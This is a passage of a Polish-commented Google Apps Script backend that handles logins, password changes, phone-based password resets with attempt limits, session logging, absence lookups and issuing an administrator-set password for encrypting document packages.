  // Przy pustym polu zostaje dotychczasowa wartość — też przez _tekst(): arkusz oddaje zapisany „'=…” już bez apostrofu.
  if (pelne) {
    sh.getRange(nr, 5, 1, 6).setValues([[teraz,
        _wersjaKlienta(dane) || _tekst(w[5], 20), _tekst(dane.system, 30) || _tekst(w[6], 30),
        uruchomien, dokumentow, minut]]);
  }

  // Status sesji
  var wazne = _dataKomorki(ss, kod, "Wazne do", w[3]);
  var dzis = new Date(); dzis.setHours(0, 0, 0, 0);
  var aktywna = !!(wazne && wazne >= dzis);

  return {
    status: aktywna ? "ok" : "wygasla",
    // Bez podpisu hasłem: tylko status i data — bez imienia, rejonu i L4.
    // „pelne” mówi klientowi, czy dostał komplet (nie wolno mu wtedy nadpisywać
    // zapamiętanych danych pustymi).
    pelne: pelne,
    imie: pelne ? String(w[1] || "") : "",
    rejon: pelne ? String(w[2] || "") : "",
    wazne_do: wazne ? Utilities.formatDate(wazne, "Europe/Warsaw", "yyyy-MM-dd") : "",
    nieobecnosci: pelne ? _nieobecnosci(ss, kod) : []
  };
}

/* ------------------------------------------------------------------ */
/*  Nieobecności: urlopy / L4 / zastępstwa                            */
/*  Zwracamy tylko bieżące i przyszłe — historia programu nie obchodzi */
/*  I TYLKO WŁASNE (kod pytającego) oraz osób, które pytający zastępuje */
/*  — puls nie sprawdza hasła, więc nie może oddawać L4 całego zespołu */
/*  każdemu, kto zna czyjś kod. Bez kodu (wywołanie wewnętrzne) — nic.  */
/* ------------------------------------------------------------------ */
function _nieobecnosci(ss, kod) {
  kod = String(kod || "").trim();
  if (!kod) return [];
  var sh = ss.getSheetByName(ZAKLADKA_NIEOBECNOSCI);
  if (!sh || sh.getLastRow() < 2) return [];
  var dzis = new Date(); dzis.setHours(0, 0, 0, 0);
  var wynik = [];
  var dane = sh.getRange(2, 1, sh.getLastRow() - 1, 6).getValues();
  for (var i = 0; i < dane.length; i++) {
    var od = dane[i][1], doD = dane[i][2];
    if (!(od instanceof Date) || !(doD instanceof Date)) continue;
    if (doD < dzis) continue;                       // już minęła
    var czyj = String(dane[i][0]).trim();
    var zastepca = String(dane[i][4] || "").trim();
    if (czyj !== kod && zastepca !== kod) continue; // cudza nieobecność
    wynik.push({
      kod: czyj,
      od:  Utilities.formatDate(od,  "Europe/Warsaw", "yyyy-MM-dd"),
      do:  Utilities.formatDate(doD, "Europe/Warsaw", "yyyy-MM-dd"),
      typ: String(dane[i][3] || "").trim(),         // urlop / L4 / zastepstwo
      zastepuje: String(dane[i][4] || "").trim()    // kod osoby zastępowanej
    });
  }
  return wynik;
}

/* rodzaj: "wazne" — zdarzenie po udanym uwierzytelnieniu (osobny przydział, zob. WAZNYCH_NA_GODZINE);
           "konto" — odmowa dotycząca ISTNIEJĄCEGO konta (zły telefon przy resecie, odrzucona zmiana hasła): ślad próby
                     przejęcia; własny przydział jak „wazne” (te same limity, osobne liczniki; i tak ogranicza ją limit prób na kod);
           "raz"   — zdarzenie, które każdy wywoła bez hasła (zły format kodu, zły podpis, błąd serwera, przekroczony limit):
                     najwyżej RAZ_NA_GODZINE wpisów danego zdarzenia na godzinę — licznik na zdarzenie, nie na kod (kodów jest
                     100 000, więc liczniki na kod zapełniałyby pamięć podręczną i nie chroniłyby dziennika). */
var RAZ_NA_GODZINE = 20;
function _log(ss, kod, zdarzenie, szczegoly, rodzaj) {
  try {
    if (rodzaj === "raz" && _licznik("wpis:" + zdarzenie, 3600, true) > RAZ_NA_GODZINE) return;
    if (!_wolnoDopisac(rodzaj === "wazne" || rodzaj === "konto" ? String(kod) : "", rodzaj)) return;      // limit wpisów na godzinę
    _zakladka(ss, ZAKLADKA_LOG, []).appendRow([new Date(), _tekst(kod, 12), _tekst(zdarzenie, 40),
                                               _tekst(szczegoly, 200)]);
  } catch (e) {}
}


var ZAKLADKA_SESJE = "Sesje";
/* NAJSTARSZA DOPUSZCZALNA WERSJA PROGRAMU przy logowaniu.
   Starsze kopie dostana odmowe logowania — dziala takze wtedy, gdy ktos
   zachowa program na pendrive. Podnies ten numer, gdy chcesz wymusic
   aktualizacje u wszystkich OD RAZU (bez okresu przejsciowego). */
var MINIMALNA_WERSJA = "3.16.0";

/* --- rozdzielacz akcji -------------------------------------------- */
function doPost(e) {
  var blokada = LockService.getScriptLock();
  // Bez blokady liczniki prób i statystyki ścigałyby się z równoległym wywołaniem — lepiej odmówić (klient ponowi).
  if (!blokada.tryLock(20000)) return _json({ status: "blad", opis: "Serwer zajety — sprobuj ponownie za chwile" });
  try {
    var tresc = e && e.postData && e.postData.contents ? String(e.postData.contents) : "{}";
    if (tresc.length > 20000) return _json({ status: "blad", opis: "Zapytanie za duze" });
    var dane = JSON.parse(tresc);
    if (!dane || typeof dane !== "object" || Array.isArray(dane))
      return _json({ status: "blad", opis: "Nieprawidlowe zapytanie" });

    // Podpis: akcje z AKCJE_PODPISANE przyjmujemy tylko od programu,
    // który zna sekret aplikacji. Brak pola „podpis" to ta sama odmowa
    // co zły podpis — patrz blok bezpieczeństwa na początku pliku.
    if (AKCJE_PODPISANE.indexOf(String(dane.akcja)) >= 0
        && !weryfikujPodpis(dane)) {
      if (PODPIS_OBOWIAZKOWY) {
        return _json({ status: "blad", opis: "odmowa" });
      }
      // Okres przejściowy: nie blokujemy, ale program 3.24.0+ MUSI już
      // podpisywać poprawnie. Zły albo brakujący podpis od niego znaczy,
      // że sekret w paczce różni się od SEKRETY_PMT — dowiadujemy się
      // o tym od razu (zakładka Log, zdarzenie „podpis_zly"), a nie
      // dopiero w dniu włączenia podpisu, gdy cały zespół ma już paczkę.
      if (_wersjaCoNajmniej(dane.wersja, WERSJA_Z_SEKRETEM)) {
        _log(SpreadsheetApp.getActiveSpreadsheet(), String(dane.kod || "?"),
             "podpis_zly", "wersja " + String(dane.wersja || "?") + ", akcja "
             + String(dane.akcja) + " — sekret w paczce rozni sie od SEKRETY_PMT", "raz");
      }
    }
    // Kontrola wersji (WYMAGANA_WERSJA, domyślnie wyłączona) dotyczy programu na komputerze. Aplikacja web wysyła
    // stały numer wersji silnika (3.24.0) i klient: "web" — bramka odcięłaby ją razem ze starymi programami.
    if (AKCJE_PODPISANE.indexOf(String(dane.akcja)) >= 0
        && dane.klient !== "web" && wersjaZaStara(dane.wersja)) {
      return _json({ status: "blad",
        opis: "Ta wersja programu nie jest juz obslugiwana. Pobierz nowa wersje." });
    }

    // Aplikacja na telefon zostala wycofana (3.24.0) — backend obsluguje program na komputerze
    // i aplikacje web: szesc akcji, wszystkie podpisane.
    switch (dane.akcja) {
      case "logowanie":   return _json(logowanie(dane));
      case "puls":        return _json(obsluzPuls(dane));
      case "sesja":       return _json(zapiszSesje(dane));
      case "zmien_haslo": return _json(zmienHaslo(dane));
      case "reset_hasla": return _json(resetHasla(dane));
      case "haslo_paczki": return _json(hasloPaczki(dane));
      default: return _json({ status: "blad", opis: "Nieznana akcja" });
    }
  } catch (err) {
    // Treść wyjątku może zdradzać nazwy zakładek i szczegóły skryptu — klient dostaje ogólny komunikat.
    try { _log(SpreadsheetApp.getActiveSpreadsheet(), "?", "blad_serwera", String(err), "raz"); } catch (x) {}
    return _json({ status: "blad", opis: "Blad serwera — sprobuj ponownie" });
  } finally {
    blokada.releaseLock();
  }
}

/* --- logowanie: kod + HASLO albo TELEFON ---------------------------- */
/*  NAPRAWA (sedno "hash sie nadpisal, ale nie wchodzi"):                */
/*  Stara wersja ZAWSZE wymagala 9-cyfrowego telefonu — bramka          */
/*  `tel.length < 9` odrzucala logowanie ZANIM spojrzala na haslo.      */
/*  Haslo literowe nie ma 9 cyfr, wiec kazdy, kto ustawil haslo,        */
/*  dostawal "Podaj 9-cyfrowy numer telefonu" — a weryfikacja           */
/*  programu widziala "blad" dla nowego i starego hasla (falszywy       */
/*  alarm). Teraz: haslo sprawdzamy hashem, telefon zostaje jako        */
/*  rownolegly klucz (i tak jest kluczem odzysku w reset_hasla).        */
function logowanie(dane) {
  var kod = String(dane.kod || "").trim();
  if (!/^\d{5}$/.test(kod)) return { status: "blad", opis: "Kod musi miec 5 cyfr" };
  // Kontrola wersji programu — zanim sprawdzimy haslo.
  var wersjaKlienta = String(dane.wersja || "").trim();
  if (dane.zrodlo === "program" && wersjaKlienta && !_wersjaWystarczajaca(wersjaKlienta)) {
    _log(SpreadsheetApp.getActiveSpreadsheet(), kod, "logowanie_odrzucone",
         "za stara wersja " + wersjaKlienta, "raz");
    return { status: "blad",
             opis: "Ta wersja programu (" + wersjaKlienta + ") nie jest juz obslugiwana. " +
                   "Pobierz aktualna wersje ze strony wydania." };
  }
  var haslo = String(dane.haslo || dane.telefon || "").trim();
  if (!haslo) return { status: "blad", opis: "Podaj haslo albo numer telefonu" };
  if (_logowanieZablokowane(kod)) {
    _log(SpreadsheetApp.getActiveSpreadsheet(), kod, "logowanie_odrzucone", "za duzo nieudanych prob", "raz");
    return { status: "blad", opis: KOMUNIKAT_BLOKADY };
  }
  var tel = haslo.replace(/\D/g, "");        // to samo pole moze byc telefonem
  var sh = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(ZAKLADKA_UZYTKOWNICY);
  if (!sh || sh.getLastRow() < 2) return { status: "blad", opis: "Brak bazy uzytkownikow" };
  var w = sh.getRange(2, 1, sh.getLastRow() - 1, 14).getValues();
  for (var i = 0; i < w.length; i++) {
    if (String(w[i][0]).trim() !== kod) continue;
    var hashBaza = String(w[i][13] || "").trim();     // kolumna N: Haslo hash
    var telBaza  = String(w[i][12] || "").replace(/\D/g, "");   // kolumna M
    // TELEFON = klucz ODZYSKU, nie wejscia: gdy haslo jest USTAWIONE,
    // logowanie przyjmuje WYLACZNIE haslo (telefonem mozna haslo
    // zmienic/zresetowac, ale nie otworzyc sesji).
    var haslem   = hashBaza && _hash(kod, haslo) === hashBaza;
    var telefonem = !hashBaza && telBaza && tel.length >= 9 &&
                    telBaza.slice(-9) === tel.slice(-9);
    if (!haslem && !telefonem) {
      _nieudanaProba(kod);
      if (!hashBaza && !telBaza)
        return { status: "blad",
                 opis: "To konto nie ma telefonu w bazie — administrator musi go uzupelnic" };
      // Konto z hasłem: ten sam komunikat dla telefonu z kartoteki i dla złego hasła — inna odpowiedź
      // potwierdzałaby, że podany numer należy do tego kodu.
      return { status: "blad",
               opis: hashBaza ? KOMUNIKAT_ZLE_HASLO : "Nieprawidlowy numer telefonu" };
    }
    var zrodlo = _tekst(dane.zrodlo || "www", 20);
    _wyczyscProby(kod);
    _log(SpreadsheetApp.getActiveSpreadsheet(), kod, "logowanie_" + zrodlo,
         "OK" + (haslem ? " (haslo)" : " (telefon)"), "wazne");
    // "przez": klient zakłada sejf danych tą samą postacią hasła co serwer (telefon = ostatnie 9 cyfr)
    return { status: "ok", imie: String(w[i][1] || ""), przez: haslem ? "haslo" : "telefon" };
  }
  _nieznanyKod(SpreadsheetApp.getActiveSpreadsheet(), "logowanie_odrzucone");      // zgadywanie kodów: wspólny licznik (zob. _nieznanyKod)
  return { status: "blad", opis: "Nie znaleziono takiego kodu" };
}

/* SHA-256 z sola (kod uzytkownika) — hasla nie sa trzymane jawnie */
function _hash(kod, haslo) {
  var bajty = Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256,
                                      "PMT|" + kod + "|" + haslo, Utilities.Charset.UTF_8);
  return bajty.map(function (b) { return ((b + 256) % 256).toString(16).padStart(2, "0"); }).join("");
}

/* zmiana hasla: weryfikacja haslem LUB telefonem, zapis hasha (kanon) */
function zmienHaslo(dane) {
  var kod   = String(dane.kod || "").trim();
  var stare = String(dane.stare_haslo || dane.haslo_stare || "").trim();
  var nowe  = String(dane.nowe_haslo  || dane.haslo_nowe  || "").trim();
  if (!_kodPoprawny(kod)) return { status: "blad", opis: "Kod musi miec 5 cyfr" };
  if (!stare)          return { status: "blad", opis: "Podaj dotychczasowe haslo albo telefon" };
  if (nowe.length < 6) return { status: "blad", opis: "Nowe haslo: min. 6 znakow" };
  if (nowe.length > 200) return { status: "blad", opis: "Nowe haslo jest za dlugie" };
  if (_logowanieZablokowane(kod)) {
    _log(SpreadsheetApp.getActiveSpreadsheet(), kod, "zmiana_hasla", "ODRZUCONA (za duzo nieudanych prob)", "raz");
    return { status: "blad", opis: KOMUNIKAT_BLOKADY };
  }
  var sh = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(ZAKLADKA_UZYTKOWNICY);
  if (!sh || sh.getLastRow() < 2) return { status: "blad", opis: "Brak bazy uzytkownikow" };
  var w = sh.getRange(2, 1, sh.getLastRow() - 1, 14).getValues();
  for (var i = 0; i < w.length; i++) {
    if (String(w[i][0]).trim() !== kod) continue;
    var hashBaza = String(w[i][13] || "").trim();
    var telBaza  = String(w[i][12] || "").replace(/\D/g, "");
    var stareTel = stare.replace(/\D/g, "");
    // akceptujemy: poprawne dotychczasowe haslo ALBO telefon z kartoteki —
    // ale telefon TYLKO wtedy, gdy konto hasla jeszcze NIE MA (pierwsze
    // logowanie albo tuz po reset_hasla). Ten sam warunek, co w logowanie():
    // dotad telefon podmienial haslo takze na koncie z ustawionym hashem,
    // wiec kto znal cudzy numer, przejmowal cudze konto.
    var telPasuje = telBaza && stareTel.length >= 9 &&
                    telBaza.slice(-9) === stareTel.slice(-9);
    var haslem   = hashBaza && _hash(kod, stare) === hashBaza;
    var telefonem = !hashBaza && telPasuje;
    if (!haslem && !telefonem) {
      _nieudanaProba(kod);
      var powod = hashBaza ? (telPasuje ? "telefon zamiast hasla" : "zle haslo")
                           : "zly telefon";
      _log(SpreadsheetApp.getActiveSpreadsheet(), kod, "zmiana_hasla",
           "ODRZUCONA (" + powod + ")", "konto");
      // jak w logowanie(): odpowiedź nie mówi, czy podany numer pasuje do kodu (powód zostaje tylko w Log)
      return { status: "blad", opis: hashBaza
               ? "Dotychczasowe haslo nie pasuje (jesli go nie pamietasz, uzyj „Nie pamietam hasla” w oknie logowania)"
               : "Numer telefonu nie zgadza sie z kartoteka" };
    }
    sh.getRange(i + 2, 14).setValue(_hash(kod, nowe));
    _wyczyscProby(kod);
    _log(SpreadsheetApp.getActiveSpreadsheet(), kod, "zmiana_hasla",
         "OK (" + (haslem ? "haslem" : "telefonem") + ")", "wazne");
    return { status: "ok" };
  }
  _nieznanyKod(SpreadsheetApp.getActiveSpreadsheet(), "zmiana_hasla");
  return { status: "blad", opis: "Nie znaleziono takiego kodu" };
}


/* ====== HASŁO DO PACZEK Z DOKUMENTAMI (nadaje administrator) ============== */
/*  Aplikacja web zahasłowuje paczkę z podpisanymi dokumentami (jest w nich PESEL) przed wysłaniem pocztą.   */
/*  Hasło NIE jest wymyślane przez użytkownika: wpisujesz je Ty w zakładce „Ustawienia” razem z ostatnim     */
/*  dniem ważności, a aplikacja pobiera je z tego skryptu tuż przed wysyłką (użytkownik go nie widzi).      */
/*  Tam samo wpisujesz adres e-mail odbiorcy, na który aplikacja przygotowuje wiadomość z paczką.            */
/*  Odbiorca poczty dostaje hasło od Ciebie — jedno dla paczek od wszystkich użytkowników. Po dacie ważności */
/*  skrypt hasła nie wydaje, dopóki nie wpiszesz nowego.                                                    */
/*  Zakładka „Ustawienia” (utworzy ją inicjalizuj()):  A = klucz, B = wartość, C = opis.                    */
var USTAWIENIE_HASLO_PACZKI = "haslo_paczki";
var USTAWIENIE_HASLO_PACZKI_DO = "haslo_paczki_wazne_do";
var USTAWIENIE_ADRES_ODBIORCY = "adres_odbiorcy";

function _ustawieniaPaczki(ss) {
  var sh = _zakladka(ss, ZAKLADKA_USTAWIENIA, ["Klucz", "Wartosc", "Opis"]);
  var klucze = {};
  var w = sh.getLastRow() > 1 ? sh.getRange(2, 1, sh.getLastRow() - 1, 1).getValues() : [];
  for (var i = 0; i < w.length; i++) klucze[String(w[i][0]).trim()] = true;
  if (!klucze[USTAWIENIE_HASLO_PACZKI]) {
    sh.appendRow([USTAWIENIE_HASLO_PACZKI, "",
      "Haslo, ktorym aplikacja zahaslowuje paczke z dokumentami (min. 8 znakow; nie zaczynaj od = + - @). Odbiorca poczty dostaje je od Ciebie. Zostaw puste, by wylaczyc wysylke."]);
    // komórka hasła jako zwykły tekst: inaczej arkusz zamienia „0012345678” w liczbę 12345678, a „15.01.2027” w datę
    sh.getRange(sh.getLastRow(), 2).setNumberFormat("@");
  }
  if (!klucze[USTAWIENIE_HASLO_PACZKI_DO]) sh.appendRow([USTAWIENIE_HASLO_PACZKI_DO, "",
    "Ostatni dzien waznosci hasla, np. 2026-12-31 (po tej dacie aplikacja nie wysle paczki, dopoki nie wpiszesz nowego hasla i nowej daty)."]);
  if (!klucze[USTAWIENIE_ADRES_ODBIORCY]) sh.appendRow([USTAWIENIE_ADRES_ODBIORCY, "",
    "Adres e-mail, na ktory aplikacja przygotowuje wiadomosc z zahaslowana paczka dokumentow (odbiorca czyta paczki od wszystkich uzytkownikow jednym haslem)."]);
  return sh;
}
/* Data z komórki: data (arkusz rozpoznał wpis) albo tekst. Tekst „RRRR-MM-DD” i polski „DD.MM.RRRR” czytamy wprost —
   new Date() czyta „10.11.2026” jako 11 października, a „31.12.2026” jako złą datę (błąd serwera przy każdym pulsie);
   inne postacie tekstu jak dotąd przez new Date(). Nieczytelna (także liczba) = null, czyli jak pusta komórka. */
function _data(v) {
  if (Object.prototype.toString.call(v) === "[object Date]") return isNaN(v.getTime()) ? null : v;
  if (typeof v !== "string") return null;
  var s = v.trim(), m, r, mc, dz;
  if ((m = /^(\d{4})-(\d{1,2})-(\d{1,2})$/.exec(s))) { r = +m[1]; mc = +m[2]; dz = +m[3]; }
  else if ((m = /^(\d{1,2})\.(\d{1,2})\.(\d{4})$/.exec(s))) { r = +m[3]; mc = +m[2]; dz = +m[1]; }
  else {
    var d0 = s ? new Date(s) : null;
    return d0 && !isNaN(d0.getTime()) && d0.getFullYear() >= 2000 && d0.getFullYear() <= 2200 ? d0 : null;
  }
  var d = new Date(r, mc - 1, dz, 12);      // w południe: ten sam dzień w Europe/Warsaw przy każdej strefie czasowej skryptu
  return d.getFullYear() === r && d.getMonth() === mc - 1 && d.getDate() === dz ? d : null;
}
/* _data() z wpisem w Log, gdy komórka nie jest pusta, a daty nie da się odczytać (administrator widzi, co poprawić). */
function _dataKomorki(ss, kod, pole, v) {
  var d = _data(v);
  if (!d && String(v === null || v === undefined ? "" : v).trim())
    _log(ss, kod, "nieczytelna_data", pole + ": " + String(v).slice(0, 40) + " — wpisz date jako RRRR-MM-DD albo DD.MM.RRRR", "raz");
  return d;
}
function _dataIso(v) {
  var d = _data(v);
  if (!d) return "";
  var p = function (n) { return ("0" + n).slice(-2); };
  return d.getFullYear() + "-" + p(d.getMonth() + 1) + "-" + p(d.getDate());
}
/* Hasło paczki z komórki: tekst albo liczba całkowita (arkusz zamienia wpisane same cyfry na liczbę). Data, wartość logiczna,
   ułamek albo liczba bez pełnej precyzji to już nie to, co wpisał administrator (np. „1234,5678” → „1234.5678”, data →
   „Fri Jan 15 2027…”), a paczki zaszyfrowanej takim hasłem odbiorca nie otworzy — wtedy hasła nie wydajemy („brak”). */
function _hasloZKomorki(ss, v) {
  if (v === null || v === undefined || typeof v === "string") return String(v || "").trim();
  if (typeof v === "number" && Number.isSafeInteger(v) && v >= 0) return String(v);
  _log(ss, "Ustawienia", "haslo_paczki_blad", "komorka hasla w zakladce Ustawienia nie jest tekstem — ustaw jej format Zwykly tekst i wpisz haslo ponownie", "raz");
  return "";
}
function hasloPaczki(dane) {
  var kod = String(dane.kod || "").trim();
  if (!_kodPoprawny(kod)) return { status: "odmowa" };
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var sh = _zakladka(ss, ZAKLADKA_UZYTKOWNICY, []);
  var wiersze = sh.getDataRange().getValues(), w = null;
  for (var i = 1; i < wiersze.length; i++) { if (String(wiersze[i][0]).trim() === kod) { w = wiersze[i]; break; } }
  // Hasło wydajemy tylko istniejącemu kontu, które potwierdziło się podpisem swojego hasła (nie samym kodem) i ma ważną sesję.
  if (!w || !_podpisHaslaOk(dane, String(w[13] || "").trim())) {
    _log(ss, kod, "haslo_paczki_odmowa", "brak podpisu hasla albo nieznany kod", "raz");
    return { status: "odmowa" };
  }
  var wazne = _dataKomorki(ss, kod, "Wazne do", w[3]);
  var dzis = new Date(); dzis.setHours(0, 0, 0, 0);
  if (!(wazne && wazne >= dzis)) return { status: "wygasla" };
  var sU = _ustawieniaPaczki(ss), u = sU.getLastRow() > 1 ? sU.getRange(2, 1, sU.getLastRow() - 1, 2).getValues() : [];
  var haslo = "", doDaty = "", adres = "";
  for (var j = 0; j < u.length; j++) {
    var k = String(u[j][0]).trim();
    if (k === USTAWIENIE_HASLO_PACZKI) haslo = _hasloZKomorki(ss, u[j][1]);
    else if (k === USTAWIENIE_HASLO_PACZKI_DO) { _dataKomorki(ss, "Ustawienia", USTAWIENIE_HASLO_PACZKI_DO, u[j][1]); doDaty = _dataIso(u[j][1]); }
    else if (k === USTAWIENIE_ADRES_ODBIORCY) adres = String(u[j][1] === null || u[j][1] === undefined ? "" : u[j][1]).trim();
  }
  // Wysyłka jest włączona dopiero, gdy wpisane są wszystkie trzy rzeczy: hasło, termin jego ważności i poprawny adres odbiorcy.
  if (!haslo || !doDaty || !/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(adres)) return { status: "brak" };
  var ostatni = new Date(doDaty + "T00:00:00");
  if (ostatni < dzis) return { status: "wygaslo", wazne_do: doDaty };      // po terminie hasła nie wydajemy
  _log(ss, kod, "haslo_paczki", "pobrane, wazne do " + doDaty, "wazne");
  return { status: "ok", haslo: haslo, wazne_do: doDaty, adres: adres };
}


/* ====== REJESTR SESJI: kto, kiedy i jak dlugo pracowal ================= */
function zapiszSesje(dane) {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var kod = String(dane.kod || "").trim();
  var imie = "", znaleziony = false, hashBaza = "";
  var shU = ss.getSheetByName(ZAKLADKA_UZYTKOWNICY);
  if (_kodPoprawny(kod) && shU && shU.getLastRow() > 1) {
    var w = shU.getRange(2, 1, shU.getLastRow() - 1, 14).getValues();
    for (var i = 0; i < w.length; i++) {
      if (String(w[i][0]).trim() === kod) { imie = String(w[i][1] || ""); hashBaza = String(w[i][13] || "").trim(); znaleziony = true; break; }
    }
  }
  // Wpis tylko dla istniejącego konta, z podpisem hasłem i w granicach limitu —
  // inaczej rejestr sesji dałoby się zasypać (albo sfałszować) wpisami z dowolnym tekstem.
  if (!znaleziony || !_czyUwierzytelniony(dane, hashBaza) || !_wolnoDopisac(kod)) return { status: "ok" };
  var nazwy = { logowanie: "zalogowanie", wylogowanie: "wylogowanie",
                zamkniecie: "zamkniecie programu" };
  _zakladka(ss, ZAKLADKA_SESJE,
    ["Kiedy", "Kod", "Imie i nazwisko", "Zdarzenie", "Czas sesji (min)",
     "Dokumenty w sesji", "Plany wizyt", "Wersja programu"])
    .appendRow([new Date(), kod, _tekst(imie, 100),
                nazwy[String(dane.rodzaj)] || _tekst(dane.rodzaj || "?", 30),
                _liczba(dane.minuty, 1440) || "",
                _liczba(dane.dokumenty, 10000) || "", _liczba(dane.plany, 10000) || "",
                _wersjaKlienta(dane)]);
  return { status: "ok" };
}

/* ====== RESET HASLA ==================================================== */
/*  Administrator: recznie czysci kolumne N (Haslo hash) w zakladce         */
/*  Uzytkownicy. Uzytkownik: ta sama akcja z programu po                    */
/*  podaniu kodu i numeru telefonu z kartoteki.                             */
/*  LIMIT PROB: numer telefonu to jedyny dowod tozsamosci, wiec bez limitu  */
/*  dalo sie zgadywac. Liczymy w CacheService: na KOD (cel ataku) i LACZNIE */
/*  (Apps Script nie zdradza adresu wywolujacego — licznik laczny zastepuje */
/*  licznik „na adres"). Kazda proba, takze odrzucona, idzie do dziennika.  */
/*  Licznik laczny liczy tylko NIEUDANE proby (zly telefon, nieznany kod):  */
/*  chroni przed przeszukiwaniem kodow znanym numerem, a udane resety       */
/*  innych osob go nie zuzywaja.                                            */
var RESET_PROB_NA_KOD_NA_GODZINE     = 5;
var RESET_PROB_LACZNIE_NA_GODZINE    = 30;
var RESET_OKNO_SEKUND                = 3600;

/* Czy limit prob pod kluczem jest juz wyczerpany. Okno STALE (_licznik): kolejne
   proby go nie odnawiaja, a odrzucone nie sa doliczane — dawniej kazda proba
   odnawiala godzine, wiec jedno zapytanie na godzine blokowalo reset na zawsze. */
function _zaDuzoProb(klucz, limit) { return _licznik(klucz, RESET_OKNO_SEKUND, false) >= limit; }
function _policzProbe(klucz) { _licznik(klucz, RESET_OKNO_SEKUND, true); }

/* ODBLOKOWANIE KONT — uruchamiasz RĘCZNIE w edytorze (wybierz „odblokujKonta” z listy u góry → ▶ Uruchom), gdy ktoś
   jest zablokowany limitem prób (logowanie, podpisy hasłem, reset hasła) i nie może czekać do końca okna (do 6 godzin).
   Liczniki żyją w pamięci podręcznej skryptu, nie w arkuszu, więc wyczyszczenie „Haslo hash” ich nie zdejmuje.
   Zdejmuje liczniki wszystkich kont z zakładki Uzytkownicy; nie da się tego wywołać przez adres /exec. */
function odblokujKonta() {
  var ss = SpreadsheetApp.getActiveSpreadsheet(), sh = ss.getSheetByName(ZAKLADKA_UZYTKOWNICY);
  var w = sh && sh.getLastRow() > 1 ? sh.getRange(2, 1, sh.getLastRow() - 1, 1).getValues() : [];
  var klucze = ["reset:wszyscy"], kont = 0, pam = CacheService.getScriptCache();
  for (var i = 0; i < w.length; i++) {
    var kod = String(w[i][0]).trim();
    if (_kodPoprawny(kod)) { klucze.push("lg:k:" + kod, "lg:d:" + kod, "ph:" + kod, "reset:" + kod); kont++; }
  }
  for (var j = 0; j < klucze.length; j += 100) pam.removeAll(klucze.slice(j, j + 100));
  _log(ss, "admin", "odblokowanie", "zdjete liczniki prob: " + kont + " kont", "wazne");
}

function resetHasla(dane) {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var kod = String(dane.kod || "").trim();
  var tel = String(dane.telefon || "").replace(/\D/g, "");
  if (!_kodPoprawny(kod)) {
    _log(ss, kod, "reset_hasla", "ODRZUCONA (zly format kodu)", "raz");
    return { status: "blad", opis: "Kod musi miec 5 cyfr" };
  }
  var kluczKodu = "reset:" + kod, kluczLaczny = "reset:wszyscy";
  if (_zaDuzoProb(kluczKodu, RESET_PROB_NA_KOD_NA_GODZINE) ||
      _zaDuzoProb(kluczLaczny, RESET_PROB_LACZNIE_NA_GODZINE)) {
    _log(ss, kod, "reset_hasla", "ODRZUCONA (za duzo prob)", "raz");
    return { status: "blad", opis: "Za duzo prob resetu — sprobuj za godzine" };
  }
  var sh = ss.getSheetByName(ZAKLADKA_UZYTKOWNICY);
  if (!sh || sh.getLastRow() < 2) {
    _log(ss, kod, "reset_hasla", "ODRZUCONA (brak bazy)");
    return { status: "blad", opis: "Brak bazy uzytkownikow" };
  }
  var w = sh.getRange(2, 1, sh.getLastRow() - 1, 14).getValues();
  for (var i = 0; i < w.length; i++) {
    if (String(w[i][0]).trim() !== kod) continue;
    _policzProbe(kluczKodu);      // licznik na kod dopiero dla istniejącego konta (nieznane kody liczy licznik łączny — bez klucza na każdy z 100 000 kodów)
    var telBaza = String(w[i][12] || "").replace(/\D/g, "");
    if (!telBaza) {
      _policzProbe(kluczLaczny);
      _log(ss, kod, "reset_hasla", "ODRZUCONA (konto bez telefonu)", "konto");
      return { status: "blad", opis: "Konto nie ma telefonu w kartotece — zglos sie do administratora" };
    }
    if (tel.length < 9 || telBaza.slice(-9) !== tel.slice(-9)) {
      _policzProbe(kluczLaczny);
      _log(ss, kod, "reset_hasla", "ODRZUCONA (zly telefon)", "konto");
      return { status: "blad", opis: "Numer telefonu nie zgadza sie z kartoteka" };
    }
    sh.getRange(i + 2, 14).setValue("");     // kasujemy hash hasla
    _wyczyscProby(kod);                       // telefon z kartoteki potwierdził tożsamość — odblokowujemy logowanie
    _log(ss, kod, "reset_hasla", "OK", "wazne");
    return { status: "ok",
             opis: "Haslo skasowane. Zaloguj sie numerem telefonu i ustaw nowe haslo." };
  }
  _policzProbe(kluczLaczny);
  _log(ss, kod, "reset_hasla", "ODRZUCONA (nieznany kod)", "raz");
  return { status: "blad", opis: "Nie znaleziono takiego kodu" };
}


/* Porownanie wersji: czy klient ma co najmniej MINIMALNA_WERSJA */
function _wersjaWystarczajaca(wersja) {
  function _naLiczbe(w) {
    var cz = String(w).split(".").map(function (x) {
      var c = String(x).replace(/\D/g, "");
      return c ? parseInt(c, 10) : 0;
    });
    while (cz.length < 3) cz.push(0);
    return cz[0] * 1000000 + cz[1] * 1000 + cz[2];
  }
  return _naLiczbe(wersja) >= _naLiczbe(MINIMALNA_WERSJA);
}
